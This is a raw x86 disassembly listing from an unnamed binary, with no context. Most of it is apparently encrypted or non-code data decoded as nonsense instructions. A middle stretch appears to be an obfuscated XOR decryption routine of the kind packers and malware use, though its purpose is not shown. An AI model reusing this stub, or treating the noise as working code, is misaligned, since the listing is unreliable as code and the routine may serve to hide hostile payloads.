  4059b1:	repz ss pop ebx
  4059b4:	das    
  4059b5:	xor    DWORD PTR es:[ecx],edi
  4059b8:	or     al,0x9f
  4059ba:	xchg   ebp,eax
  4059bb:	imul   edi,ebp,0x6a
  4059be:	mov    ds:0x862b0888,al
  4059c3:	imul   edi,ecx,0xffffffb2
  4059c6:	push   esi
  4059c7:	sub    BYTE PTR ds:0xb064c33c,0xd
  4059ce:	in     al,0x3d
  4059d0:	shl    DWORD PTR [esi+edi*4-0x2b5a3f],0xc2
  4059d8:	mov    DWORD PTR [edi+0x5b],esp
  4059db:	sbb    eax,0xcb0e54c2
  4059e0:	cmp    BYTE PTR [ebp-0x6f969591],bh
  4059e6:	jbe    0x4059a9
  4059e8:	out    0x2a,eax
  4059ea:	gs call 0x1bef673b
  4059f0:	xlat   BYTE PTR ds:[ebx]
  4059f1:	push   ecx
  4059f2:	pop    ss
  4059f3:	or     eax,0x5760b77
  4059f8:	sbb    esp,ebp
  4059fa:	sub    BYTE PTR [esi],bh
  4059fc:	cli    
  4059fd:	or     bh,BYTE PTR [edi-0x7b]
  405a00:	add    al,0xc6
  405a02:	mov    esi,0xf14ee642
  405a07:	call   0xb3287f71
  405a0c:	pop    edi
  405a0d:	add    ebx,DWORD PTR [eax+0x53da8bf4]
  405a13:	pop    edi
  405a14:	inc    ebp
  405a15:	push   esp
  405a16:	jp     0x405a2d
  405a18:	cmp    al,0x2e
  405a1a:	jb     0x4059e4
  405a1c:	data16 add dh,BYTE PTR ds:0x71b9dee
  405a23:	pop    edi
  405a24:	xchg   BYTE PTR [ebp+0x3f6c6cc9],bl
  405a2a:	jecxz  0x405a09
  405a2c:	shr    DWORD PTR [ecx+0x29],1
  405a2f:	scas   eax,DWORD PTR es:[edi]
  405a30:	adc    BYTE PTR [ecx+0x63],ah
  405a33:	adc    eax,0x703c170c
  405a38:	xchg   edi,eax
  405a39:	int3   
  405a3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a3b:	add    al,cl
  405a3d:	mov    ecx,es
  405a3f:	mov    ecx,0x9e65d7b5
  405a44:	fmul   st,st(6)
  405a46:	nop
  405a47:	lods   eax,DWORD PTR ds:[esi]
  405a48:	nop
  405a49:	dec    esi
  405a4a:	pop    ebp
  405a4b:	or     al,0xe7
  405a4d:	mov    ecx,DWORD PTR [eax+esi*1+0x41]
  405a51:	jns    0x405aac
  405a53:	mov    dl,0xbe
  405a55:	out    0x4e,al
  405a57:	ss popa 
  405a59:	ror    DWORD PTR [ebx+esi*8],1
  405a5c:	in     eax,dx
  405a5d:	or     al,0xaf
  405a5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a60:	out    dx,eax
  405a61:	mov    ah,0x5b
  405a63:	add    DWORD PTR [esi+0x49],edi
  405a66:	repz cmp al,0x31
  405a69:	rcr    BYTE PTR [edi-0x4e2f0069],cl
  405a6f:	xchg   DWORD PTR [edx-0xb1518c0],eax
  405a75:	in     al,dx
  405a76:	sub    eax,edx
  405a78:	out    0xd,al
  405a7a:	dec    ebx
  405a7b:	jmp    0x84ba3845
  405a80:	sar    ebp,1
  405a82:	mov    dl,0x97
  405a84:	aas    
  405a85:	pop    ds
  405a86:	ja     0x405a31
  405a88:	sbb    al,0x77
  405a8a:	cmp    cl,bh
  405a8c:	aaa    
  405a8d:	call   0x791d98b7
  405a92:	shl    BYTE PTR [ecx+0x3fcf699b],1
  405a98:	cmp    BYTE PTR [ecx-0x58],bh
  405a9b:	mov    DWORD PTR [eax+0x74baf076],ebp
  405aa1:	out    0x3b,eax
  405aa3:	gs aad 0x43
  405aa6:	pop    es
  405aa7:	xor    cl,BYTE PTR [esi+0x71600f99]
  405aad:	jns    0x405ab9
  405aaf:	mov    WORD PTR [esi],?
  405ab1:	push   es
  405ab2:	les    esi,FWORD PTR [ecx-0x4e4995a6]
  405ab8:	jle    0x405ae5
  405aba:	xchg   ah,dh
  405abc:	fnstcw WORD PTR [esp+ebp*4-0x609c6617]
  405ac3:	sahf   
  405ac4:	sahf   
  405ac5:	outs   dx,DWORD PTR ds:[esi]
  405ac6:	sub    eax,0xaed5dd28
  405acb:	(bad)  
  405acd:	sar    DWORD PTR [edx+0x65],0xe0
  405ad1:	(bad)  
  405ad2:	fiadd  WORD PTR [esi-0x4e22056c]
  405ad8:	outs   dx,BYTE PTR ds:[esi]
  405ad9:	in     eax,0xb4
  405adb:	lock mov al,ds:0x9e10c983
  405ae1:	fist   DWORD PTR [eax+ecx*8]
  405ae4:	mov    esi,0xa3bd6796
  405ae9:	into   
  405aea:	sub    al,BYTE PTR [ecx+0x30]
  405aed:	mov    ecx,0xeefec8d0
  405af2:	mov    bh,0x65
  405af4:	and    DWORD PTR [eax],esi
  405af6:	inc    ecx
  405af7:	icebp  
  405af8:	out    0x76,eax
  405afa:	sbb    al,0xbc
  405afc:	pusha  
  405afd:	xor    esp,esp
  405aff:	jno    0x405b26
  405b01:	repz jnp 0x405b82
  405b04:	stc    
  405b05:	aam    0x8b
  405b07:	stos   BYTE PTR es:[edi],al
  405b08:	add    BYTE PTR [edx+edi*8-0x695972e5],bl
  405b0f:	jo     0x405b5b
  405b11:	dec    ebx
  405b12:	cmc    
  405b13:	cmp    eax,0x41009516
  405b18:	pop    ecx
  405b19:	lds    ebx,FWORD PTR [edi+0x1ecff6ce]
  405b1f:	adc    eax,0xfd9932aa
  405b24:	cmp    esp,0xc2e02485
  405b2a:	lock push es
  405b2c:	cmp    eax,0xcc8f18bd
  405b31:	inc    edi
  405b32:	and    al,0xff
  405b34:	and    dl,BYTE PTR [ecx-0x54]
  405b37:	lock popf 
  405b39:	mov    al,ds:0xf9f7dfc0
  405b3e:	lds    ecx,FWORD PTR [edi]
  405b40:	in     al,0x23
  405b42:	(bad)  
  405b43:	imul   DWORD PTR [esi]
  405b45:	push   edx
  405b46:	push   ss
  405b47:	jb     0x405bc3
  405b49:	mov    dl,0x5d
  405b4b:	inc    ebp
  405b4c:	fwait
  405b4d:	jae    0x405aea
  405b4f:	pop    edx
  405b50:	push   es
  405b51:	test   DWORD PTR [eax+0x612dfdf3],ebp
  405b57:	jbe    0x405b4b
  405b59:	push   esi
  405b5a:	sahf   
  405b5b:	sub    DWORD PTR [edi+0x2b],eax
  405b5e:	or     bh,0xf4
  405b61:	fsubr  st(0),st
  405b63:	jge    0x405b5b
  405b65:	pop    ss
  405b66:	popa   
  405b67:	cld    
  405b68:	xor    BYTE PTR [eax+ebx*8-0x7b6ac5c0],dh
  405b6f:	dec    esi
  405b70:	dec    ecx
  405b71:	add    eax,DWORD PTR [eax]
  405b73:	fcmovne st,st(2)
  405b75:	xor    cl,BYTE PTR [edx-0x2]
  405b78:	add    DWORD PTR [ebx],eax
  405b7a:	pop    eax
  405b7b:	sbb    al,0xe
  405b7d:	add    eax,0xf77a647e
  405b82:	jg     0x405b6e
  405b84:	scas   eax,DWORD PTR es:[edi]
  405b85:	mov    ds:0x73d48421,al
  405b8a:	dec    esp
  405b8b:	and    DWORD PTR [edi],edi
  405b8d:	push   es
  405b8e:	bound  ebp,QWORD PTR [ecx]
  405b90:	xor    DWORD PTR [ecx-0xa],0xb9cb0a90
  405b97:	mov    edi,0x792c0265
  405b9c:	jle    0x405c0e
  405b9e:	jecxz  0x405c12
  405ba0:	xor    esp,ebx
  405ba2:	es pop ds
  405ba4:	xchg   BYTE PTR [eax+eax*2-0x30],ah
  405ba8:	pop    ecx
  405ba9:	xchg   edx,eax
  405baa:	rcr    esp,cl
  405bac:	ror    BYTE PTR [ebp-0x41],0xa7
  405bb0:	ds aaa 
  405bb2:	ret    0xb9ca
  405bb5:	xor    bh,BYTE PTR ds:0x2acc1e76
  405bbb:	bound  eax,QWORD PTR [edi-0x6f]
  405bbe:	mov    edi,eax
  405bc0:	cmp    BYTE PTR [ecx],bl
  405bc2:	xchg   BYTE PTR [ebx-0x13df0355],dl
  405bc8:	push   ds
  405bc9:	addr16 inc ecx
  405bcb:	sbb    al,0x7f
  405bcd:	stos   BYTE PTR es:[edi],al
  405bce:	popa   
  405bcf:	(bad)  
  405bd1:	js     0x405be5
  405bd3:	cs aad 0x9d
  405bd6:	(bad)  [eax]
  405bd8:	pop    esp
  405bd9:	lea    edx,[esi-0x1d]
  405bdc:	jp     0x405c12
  405bde:	ror    DWORD PTR [ecx-0x1f],cl
  405be1:	jbe    0x405c5e
  405be3:	mov    edx,DWORD PTR [ebx+0x5a80e644]
  405be9:	xchg   esp,eax
  405bea:	leave  
  405beb:	push   ebx
  405bec:	mov    bl,0xdc
  405bee:	cmp    al,0xe8
  405bf0:	ins    BYTE PTR es:[edi],dx
  405bf1:	pop    es
  405bf2:	repnz cs call 0x7648:0xc4c03d3d
  405bfb:	pop    es
  405bfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bfd:	mov    dl,0x6e
  405bff:	inc    edi
  405c00:	repnz adc DWORD PTR [edx-0x63b15701],ebp
  405c07:	enter  0x4828,0xb
  405c0b:	adc    BYTE PTR [esi+0xb33d283],bh
  405c11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c12:	add    al,cl
  405c14:	lea    edi,[eax]
  405c16:	mov    dh,BYTE PTR [esi-0x13]
  405c19:	bound  eax,QWORD PTR ds:0xcf17f6ef
  405c1f:	adc    DWORD PTR ds:0x74ca9cdb,ebp
  405c25:	cmp    ebp,DWORD PTR [esi+0x318a6ad0]
  405c2b:	ja     0x405c1c
  405c2d:	lock imul edi,DWORD PTR [esi],0xc06dd1ac
  405c34:	mov    bh,0x4d
  405c36:	mov    WORD PTR [eax-0xf55a264],fs
  405c3c:	div    BYTE PTR [ecx]
  405c3e:	push   ecx
  405c3f:	mov    edx,0x2c76d703
  405c44:	in     eax,dx
  405c45:	ja     0x405c02
  405c47:	sbb    BYTE PTR [ecx-0x3d],bh
  405c4a:	ret    
  405c4b:	push   edi
  405c4c:	(bad)
  405c51:	leave  
  405c52:	add    edi,DWORD PTR ds:0x63f8cc68
  405c58:	std    
  405c59:	inc    eax
  405c5a:	sbb    dl,ah
  405c5c:	inc    ebx
  405c5d:	in     eax,0x8e
  405c5f:	in     al,0x6b
  405c61:	into   
  405c62:	mov    bh,0x94
  405c64:	mul    DWORD PTR [ebx-0x8]
  405c67:	in     eax,0xf1
  405c69:	jp     0x405beb
  405c6b:	rol    BYTE PTR [ecx],cl
  405c6d:	das    
  405c6e:	xchg   edx,eax
  405c6f:	xlat   BYTE PTR ds:[ebx]
  405c70:	xchg   ebp,ebp
  405c72:	lss    ebx,FWORD PTR [esi-0x3ae0ce1f]
  405c79:	(bad)  
  405c7a:	adc    edx,DWORD PTR [ecx+edx*4]
  405c7d:	mov    bh,0xc2
  405c7f:	je     0x405c0c
  405c81:	fimul  WORD PTR [ebp+0x2f]
  405c84:	dec    esp
  405c85:	mov    al,ds:0xb950c1c8
  405c8a:	mov    bl,0xd3
  405c8c:	(bad)  
  405c8d:	mov    esp,0xf8bd5306
  405c92:	iret   
  405c93:	test   esi,edx
  405c95:	popa   
  405c96:	add    bl,BYTE PTR [ebx+0x12]
  405c99:	push   0x17c81826
  405c9e:	or     bl,BYTE PTR [eax]
  405ca0:	lods   eax,DWORD PTR ds:[esi]
  405ca1:	add    bh,BYTE PTR [ecx+0x3af82dc7]
  405ca7:	test   BYTE PTR [ebx+0x19],bl
  405caa:	xchg   ebp,eax
  405cab:	push   eax
  405cac:	out    0x7d,eax
  405cae:	fimul  DWORD PTR [esi+edx*1]
  405cb1:	and    DWORD PTR [ebp-0x340b2f7],0xffffffd2
  405cb8:	rol    DWORD PTR [esi+0x3ff4e7bb],0x9
  405cbf:	mov    DWORD PTR ds:0x36b81bbd,0x59b3f835
  405cc9:	xchg   ecx,eax
  405cca:	or     eax,DWORD PTR [ebx+0x0]
  405ccd:	mov    cl,0xd4
  405ccf:	sub    ebp,DWORD PTR [edx-0x43b66807]
  405cd5:	das    
  405cd6:	push   0x3f
  405cd8:	sub    BYTE PTR [edi],bh
  405cda:	adc    BYTE PTR [edi],al
  405cdc:	add    edi,DWORD PTR [edx-0x6d58c4f2]
  405ce2:	scas   eax,DWORD PTR es:[edi]
  405ce3:	lods   eax,DWORD PTR ds:[esi]
  405ce4:	push   esi
  405ce5:	into   
  405ce6:	adc    ecx,edx
  405ce8:	sub    BYTE PTR [edx],0x2f
  405ceb:	(bad)  
  405cec:	add    al,0xe1
  405cee:	adc    al,0x87
  405cf0:	pushf  
  405cf1:	retf   0xdaa0
  405cf4:	jb     0x405d04
  405cf6:	mov    bl,0xeb
  405cf8:	inc    edi
  405cf9:	mov    fs,WORD PTR ds:0xdb359ebf
  405cff:	outs   dx,BYTE PTR ds:[esi]
  405d00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d01:	test   eax,0xe1458d46
  405d06:	or     edi,edi
  405d08:	das    
  405d09:	dec    esp
  405d0a:	jmp    0xfef511fd
  405d0f:	and    DWORD PTR [edx-0x41],ecx
  405d12:	aad    0xff
  405d14:	inc    ebx
  405d15:	pop    edi
  405d16:	nop
  405d17:	lea    ecx,[ebp-0x471c1107]
  405d1d:	lea    edi,gs:[ebx-0x25]
  405d21:	cmc    
  405d22:	loop   0x405d7b
  405d24:	mov    esp,0x20146734
  405d29:	cmp    al,0xe6
  405d2b:	(bad)  
  405d2c:	arpl   cx,sp
  405d2e:	push   cs
  405d2f:	sti    
  405d30:	push   ss
  405d31:	and    al,0xf
  405d33:	sbb    BYTE PTR [esp+eax*8+0x7f],0xbd
  405d38:	add    DWORD PTR [ecx-0x38c15436],ebp
  405d3e:	xor    dh,BYTE PTR [edx+ebp*1-0x6ce0b0cf]
  405d45:	call   0xc552d3e8
  405d4a:	(bad)  
  405d4b:	xchg   edx,eax
  405d4c:	mov    al,0xf5
  405d4e:	fsubr  DWORD PTR [ebp+0x5a074dbf]
  405d54:	and    eax,DWORD PTR [ebx+0x17e01f74]
  405d5a:	or     ebp,ebp
  405d5c:	cmp    ebx,DWORD PTR [edx]
  405d5e:	call   0xfd0f:0xe0405d30
  405d65:	inc    esp
  405d66:	(bad)  
  405d67:	mov    ecx,0xb2b335ad
  405d6c:	cmp    al,ah
  405d6e:	in     al,0x4d
  405d70:	fcomp  QWORD PTR ds:0x6e9e
  405d75:	(bad)  
  405d76:	sbb    BYTE PTR [edx-0x19],ch
  405d79:	inc    edx
  405d7a:	jecxz  0x405dd3
  405d7c:	(bad)  
  405d7d:	cwde   
  405d7e:	adc    bh,BYTE PTR [esi+0xd]
  405d81:	and    eax,0xb8cbeec0
  405d86:	adc    DWORD PTR ds:0x33528d26,edx
  405d8c:	scas   al,BYTE PTR es:[edi]
  405d8d:	hlt    
  405d8e:	jge    0x405d7d
  405d90:	pop    ebp
  405d91:	popa   
  405d92:	ja     0x405dbf
  405d94:	(bad)  
  405d95:	rol    DWORD PTR [ecx-0x2b],1
  405d98:	adc    DWORD PTR [esi*4+0x552ec297],0xd631a3ef
  405da3:	daa    
  405da4:	sbb    eax,0x262f9c46
  405da9:	(bad)  
  405daa:	retf   
  405dab:	loop   0x405e02
  405dad:	test   eax,0xa31793e8
  405db2:	bound  ecx,QWORD PTR [edi-0x6d]
  405db5:	pop    ebx
  405db6:	mov    ds:0x9ff442d9,eax
  405dbb:	scas   al,BYTE PTR es:[edi]
  405dbc:	adc    al,0x6e
  405dbe:	cmp    eax,0xadacedba
  405dc3:	popa   
  405dc4:	jo     0x405d73
  405dc6:	dec    edi
  405dc7:	mov    bl,0x59
  405dc9:	jno    0x405e04
  405dcb:	dec    ebx
  405dcc:	pop    esi
  405dcd:	es ins DWORD PTR es:[edi],dx
  405dcf:	sbb    edi,DWORD PTR [ebx+0x7784fb38]
  405dd5:	ins    DWORD PTR es:[edi],dx
  405dd6:	(bad)  
  405dd7:	test   DWORD PTR [edx],0xbeaff879
  405ddd:	popa   
  405dde:	cmp    edi,DWORD PTR [edx+eax*1]
  405de1:	imul   ebp,DWORD PTR [edx],0xfeef7f17
  405de7:	popf   
  405de8:	inc    edi
  405de9:	jns    0x405dc7
  405deb:	adc    BYTE PTR [edx+0x6305ff2a],0x17
  405df2:	jb     0x405e65
  405df4:	fcomp  DWORD PTR [ebx+esi*8+0x1f]
  405df8:	push   edx
  405df9:	xor    dl,BYTE PTR [ecx+0x8]
  405dfc:	in     eax,0xc4
  405dfe:	mov    cl,0xa6
  405e00:	les    ecx,FWORD PTR [eax*1+0x20c640e9]
  405e07:	mov    ecx,0xfb710e37
  405e0c:	dec    esp
  405e0d:	adc    ah,cl
  405e0f:	pop    ebp
  405e10:	dec    esi
  405e11:	cmp    dh,al
  405e13:	adc    ch,dl
  405e15:	push   ss
  405e16:	or     DWORD PTR [ecx],esp
  405e18:	ud0    ebx,DWORD PTR [ecx+eax*4+0xe009ebf]
  405e20:	(bad)  
  405e22:	mov    dh,0x6d
  405e24:	xor    al,0xa3
  405e26:	jno    0x405e91
  405e28:	imul   DWORD PTR [ebx]
  405e2a:	and    ecx,DWORD PTR [ecx-0x4e]
  405e2d:	sbb    DWORD PTR [ebx+0x5d],esi
  405e30:	cld    
  405e31:	dec    eax
  405e32:	lods   eax,DWORD PTR ds:[esi]
  405e33:	add    bh,BYTE PTR [esi+0x4c]
  405e36:	sub    eax,DWORD PTR [ebx+0x5e]
  405e39:	xor    eax,0x19ade43c
  405e3e:	xchg   edi,eax
  405e3f:	pop    eax
  405e40:	es aas 
  405e42:	les    edi,FWORD PTR [ecx-0x3b840e2c]
  405e48:	mov    bl,BYTE PTR [ebx+ecx*2+0x6b]
  405e4c:	push   edx
  405e4d:	sub    al,0x3c
  405e4f:	rcl    BYTE PTR [ecx+0x12],1
  405e52:	mov    ebp,0xbba49e61
  405e57:	push   esp
  405e58:	pop    ds
  405e59:	inc    ebx
  405e5a:	pop    ebp
  405e5b:	sub    DWORD PTR es:[esp+ebx*2+0x66],eax
  405e60:	jecxz  0x405eca
  405e62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e63:	jmp    0x405e94
  405e65:	inc    ebx
  405e66:	xor    WORD PTR [ecx-0x50d173a],cx
  405e6d:	ds xchg esp,eax
  405e6f:	stc    
  405e70:	test   ebx,edx
  405e72:	mov    esp,0xea02cee8
  405e77:	lahf   
  405e78:	push   esp
  405e79:	les    ebp,FWORD PTR [esi+0x61]
  405e7c:	loop   0x405eaf
  405e7e:	sbb    bh,BYTE PTR [ecx+ebp*4-0x1752d88a]
  405e85:	addr16 adc al,0x19
  405e88:	imul   ebx,DWORD PTR [edi],0x34
  405e8b:	add    BYTE PTR [ebx+eiz*2],dl
  405e8e:	dec    edx
  405e8f:	ins    BYTE PTR es:[edi],dx
  405e90:	cdq    
  405e91:	mov    al,0x2b
  405e93:	push   cs
  405e94:	add    DWORD PTR [esp+eiz*8],esp
  405e97:	jecxz  0x405e1e
  405e99:	inc    edi
  405e9a:	adc    al,0x3f
  405e9c:	cli    
  405e9d:	retf   
  405e9e:	push   es
  405e9f:	xor    DWORD PTR [edi],0x4855b63f
  405ea5:	or     BYTE PTR [ebp+0x188251d0],bh
  405eab:	dec    ebp
  405eac:	mov    eax,ds:0xec2c0968
  405eb1:	and    DWORD PTR [eax-0x48],edx
  405eb4:	mov    ds:0x59b876e7,al
  405eb9:	pusha  
  405eba:	nop
  405ebb:	or     BYTE PTR [esi+edx*4+0x2e],ch
  405ebf:	je     0x405ead
  405ec1:	mov    edi,0x299fb268
  405ec6:	xchg   esp,eax
  405ec7:	fsubrp st(0),st
  405ec9:	add    bl,dl
  405ecb:	in     al,0x61
  405ecd:	frstor [ecx+0x1ba974dc]
  405ed3:	add    eax,0xd82f096d
  405ed8:	(bad)  
  405ed9:	loop   0x405f2c
  405edb:	std    
  405edc:	jne    0x405ee3
  405ede:	dec    eax
  405edf:	les    esp,FWORD PTR [ebx+eax*4]
  405ee2:	ja     0x405ea7
  405ee4:	adc    eax,0x6b085858
  405ee9:	mov    eax,ds:0x94ef1915
  405eee:	cmc    
  405eef:	retf   0x4350
  405ef2:	fild   QWORD PTR [edi+edx*4-0x1b31dbfb]
  405ef9:	jecxz  0x405f13
  405efb:	das    
  405efc:	and    DWORD PTR [esp+edi*8+0x29e7d4d3],esi
  405f03:	inc    esi
  405f04:	gs mov bh,0x3e
  405f07:	cdq    
  405f08:	sbb    edx,DWORD PTR [edi-0x2d]
  405f0b:	ins    DWORD PTR es:[edi],dx
  405f0c:	les    esi,FWORD PTR [edi+0x75cd04a6]
  405f12:	sahf   
  405f13:	pop    ss
  405f14:	push   eax
  405f15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f16:	je     0x405eb1
  405f18:	add    BYTE PTR [ebp+ecx*1+0x3cd4ee55],bl
  405f1f:	(bad)  
  405f20:	adc    ch,al
  405f22:	cdq    
  405f23:	arpl   WORD PTR [ebx+edi*4],sp
  405f26:	test   al,0xcc
  405f28:	popa   
  405f29:	sub    al,0xbe
  405f2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f2c:	mov    ds:0x61ded74a,eax
  405f31:	mov    dl,0xd
  405f33:	add    eax,0xbfc69603
  405f38:	lock cmp edx,ebp
  405f3b:	dec    ecx
  405f3c:	fbstp  TBYTE PTR [ecx-0x53c84dd4]
  405f42:	daa    
  405f43:	imul   ebp,DWORD PTR [edi+ecx*2],0xd4458976
  405f4a:	mov    eax,DWORD PTR [ebp-0x58]
  405f4d:	sub    eax,ecx
  405f4f:	mov    DWORD PTR [ebp-0x1c],eax
  405f52:	mov    eax,DWORD PTR [ebp-0x1c]
  405f55:	mov    DWORD PTR [ebp-0x14],eax
  405f58:	mov    eax,DWORD PTR [ebp-0x2c]
  405f5b:	mov    DWORD PTR [ebp-0x38],0xf89c85b5
  405f62:	mov    DWORD PTR [ebp-0x54],eax
  405f65:	mov    DWORD PTR [ebp-0x20],0xf89c85b4
  405f6c:	mov    eax,DWORD PTR [ebp-0x38]
  405f6f:	xor    eax,esi
  405f71:	add    eax,edi
  405f73:	mov    DWORD PTR [ebp-0x10],eax
  405f76:	mov    eax,DWORD PTR [ebp-0x38]
  405f79:	xor    eax,esi
  405f7b:	add    eax,edi
  405f7d:	mov    DWORD PTR [ebp-0x8],eax
  405f80:	mov    DWORD PTR [ebp-0x2c],0xf89c8595
  405f87:	mov    DWORD PTR [ebp-0x44],0xf89c85be
  405f8e:	mov    eax,DWORD PTR [ebp-0x38]
  405f91:	mov    edx,DWORD PTR [ebp-0x14]
  405f94:	xor    eax,esi
  405f96:	add    eax,edi
  405f98:	cmp    edx,eax
  405f9a:	je     0x40852b
  405fa0:	mov    eax,DWORD PTR [ebp-0x20]
  405fa3:	xor    eax,esi
  405fa5:	mov    edx,0xffcd8d06
  405faa:	sub    edx,eax
  405fac:	add    edx,DWORD PTR [ebp-0x14]
  405faf:	mov    eax,DWORD PTR [ebp-0x20]
  405fb2:	mov    ebx,DWORD PTR [ebp-0x10]
  405fb5:	xor    eax,esi
  405fb7:	add    eax,edi
  405fb9:	imul   eax,ebx
  405fbc:	cmp    eax,edx
  405fbe:	ja     0x408528
  405fc4:	mov    edx,DWORD PTR [ebp-0x10]
  405fc7:	mov    eax,DWORD PTR [ebp-0x14]
  405fca:	mov    ebx,DWORD PTR [ebp-0x2c]
  405fcd:	sub    eax,edx
  405fcf:	xor    ebx,esi
  405fd1:	xor    edx,edx
  405fd3:	add    ebx,edi
  405fd5:	div    ebx
  405fd7:	mov    DWORD PTR [ebp-0x8],eax
  405fda:	mov    eax,DWORD PTR [ebp-0x44]
  405fdd:	mov    edx,DWORD PTR [ebp-0x8]
  405fe0:	xor    eax,esi
  405fe2:	add    eax,edi
  405fe4:	cmp    edx,eax
  405fe6:	jbe    0x405ff6
  405fec:	mov    eax,DWORD PTR [ebp-0x44]
  405fef:	xor    eax,esi
  405ff1:	add    eax,edi
  405ff3:	mov    DWORD PTR [ebp-0x8],eax
  405ff6:	mov    eax,DWORD PTR [ebp-0x2c]
  405ff9:	mov    edx,DWORD PTR [ebp-0x8]
  405ffc:	xor    eax,esi
  405ffe:	add    eax,edi
  406000:	imul   eax,edx
  406003:	mov    DWORD PTR [ebp-0x8],eax
  406006:	mov    eax,DWORD PTR [ebp-0x38]
  406009:	mov    edx,DWORD PTR [ebp-0x8]
  40600c:	xor    eax,esi
  40600e:	add    eax,edi
  406010:	cmp    edx,eax
  406012:	je     0x408511
  406018:	mov    eax,DWORD PTR [ebp-0x8]
  40601b:	mov    DWORD PTR [ebp-0x18],eax
  40601e:	mov    eax,DWORD PTR [ebp-0x10]
  406021:	add    eax,DWORD PTR [ebp-0x54]
  406024:	mov    DWORD PTR [ebp-0x1c],0xf89c85b5
  40602b:	mov    DWORD PTR [ebp-0x8],eax
  40602e:	mov    eax,0xf89c85b4
  406033:	mov    DWORD PTR [ebp-0x28],eax
  406036:	mov    DWORD PTR [ebp-0x5c],0xf89c85bb
  40603d:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  406044:	mov    DWORD PTR [ebp-0x30],eax
  406047:	mov    eax,DWORD PTR [ebp-0x1c]
  40604a:	xor    eax,esi
  40604c:	add    eax,edi
  40604e:	jmp    0x4084cd
  406053:	mov    DWORD PTR [ebp-0x4c],0xf89c85a2
  40605a:	mov    DWORD PTR [ebp-0x50],0xf89c85af
  406061:	mov    eax,DWORD PTR [ebp-0x30]
  406064:	mov    edx,DWORD PTR [ebp-0xc]
  406067:	xor    eax,esi
  406069:	add    eax,edi
  40606b:	imul   eax,edx
  40606e:	mov    edx,DWORD PTR [ebp-0x8]
  406071:	mov    al,BYTE PTR [eax+edx*1]
  406074:	mov    BYTE PTR [ebp-0x1],al
  406077:	mov    eax,DWORD PTR [ebp-0x30]
  40607a:	mov    edx,DWORD PTR [ebp-0xc]
  40607d:	xor    eax,esi
  40607f:	add    eax,edi
  406081:	imul   eax,edx
  406084:	mov    edx,DWORD PTR [ebp-0x5c]
  406087:	xor    edx,esi
  406089:	add    eax,edx
  40608b:	mov    edx,DWORD PTR [ebp-0x8]
  40608e:	movzx  eax,BYTE PTR [eax+edx*1+0x3272fa]
  406096:	mov    edx,DWORD PTR [ebp-0x4c]
  406099:	xor    edx,esi
  40609b:	lea    eax,[edx+eax*1+0x3272fa]
  4060a2:	movzx  edx,BYTE PTR [ebp-0x1]
  4060a6:	xor    edx,eax
  4060a8:	mov    BYTE PTR [ebp-0x1],dl
  4060ab:	mov    al,BYTE PTR [ebp-0x1]
  4060ae:	mov    edx,DWORD PTR [ebp-0x30]
  4060b1:	mov    ebx,DWORD PTR [ebp-0xc]
  4060b4:	xor    edx,esi
  4060b6:	add    edx,edi
  4060b8:	imul   edx,ebx
  4060bb:	mov    ebx,DWORD PTR [ebp-0x8]
  4060be:	mov    BYTE PTR [edx+ebx*1],al
  4060c1:	mov    eax,DWORD PTR [ebp-0x30]
  4060c4:	mov    edx,DWORD PTR [ebp-0xc]
  4060c7:	xor    eax,esi
  4060c9:	add    eax,edi
  4060cb:	imul   eax,edx
  4060ce:	mov    edx,DWORD PTR [ebp-0x8]
  4060d1:	jmp    0x408469
  4060d6:	leave  
  4060d7:	pop    es
  4060d8:	xchg   DWORD PTR ds:0x47490549,eax
  4060de:	(bad)  
  4060df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060e0:	or     bl,cl
  4060e2:	cmp    eax,0x71ebf33a
  4060e7:	sar    DWORD PTR [ebx+0x7b],0xf4
  4060eb:	pushf  
  4060ec:	jnp    0x406169
  4060ee:	add    DWORD PTR [ecx+edi*2-0xc],0x1d76aaf2
  4060f6:	jne    0x406150
  4060f8:	hlt    
  4060f9:	jo     0x40614b
  4060fb:	lahf   
  4060fc:	add    al,0x24
  4060fe:	xchg   esp,eax
  4060ff:	and    dh,BYTE PTR [edx-0x44]
  406102:	jle    0x406089
  406104:	in     eax,0x1d
  406106:	test   dh,bh
  406108:	inc    edx
  406109:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40610a:	push   ebp
  40610b:	in     eax,dx
  40610c:	pop    esp
  40610d:	inc    BYTE PTR [edx]
  40610f:	mov    BYTE PTR [ecx+0x4af509c6],dh
  406115:	xchg   esp,eax
  406116:	imul   DWORD PTR [esi+ecx*4]
  406119:	mov    eax,0xd279cb23
  40611e:	and    BYTE PTR [edi-0x65222002],bh
  406124:	and    BYTE PTR [edx-0x29],al
  406127:	adc    eax,0x156b3471
  40612c:	xor    BYTE PTR [ecx-0x6405195d],ch
  406132:	fist   DWORD PTR [di+0x282]
  406137:	jmp    0x40613c
  406139:	mov    edx,0xc34d20f1
  40613e:	xchg   ebp,eax
  40613f:	push   0x66ba95c4
  406144:	mov    al,ds:0x4ccc4872
  406149:	add    dl,bl
  40614b:	sub    eax,0x2a78e9
  406150:	jp     0x4061d0
  406152:	clc    
  406153:	out    dx,al
  406154:	aas    
  406155:	aas    
  406156:	aaa    
  406157:	outs   dx,DWORD PTR ds:[esi]
  406158:	enter  0x854c,0x2c
  40615c:	fst    DWORD PTR [edx-0x123e7b85]
  406162:	ja     0x40612f
  406164:	rcr    ch,cl
  406166:	push   DWORD PTR [eax]
  406168:	cmp    ah,BYTE PTR [ebp+0x29ea0936]
  40616e:	and    DWORD PTR [ecx-0x27],0x7bf37e04
  406175:	add    eax,0x3cd1b6af
  40617a:	sbb    BYTE PTR [edx-0x34],ah
  40617d:	loopne 0x406176
  40617f:	and    DWORD PTR [ecx-0x2e],edi
  406182:	and    eax,0x228e0fda
  406187:	mov    eax,ds:0x5f81fca5
  40618c:	in     al,dx
  40618d:	lds    edi,FWORD PTR [ebx]
  40618f:	push   esi
  406190:	xor    eax,0xc37e4911
  406195:	cli    
  406196:	jl     0x40611d
  406198:	and    esp,DWORD PTR [esi]
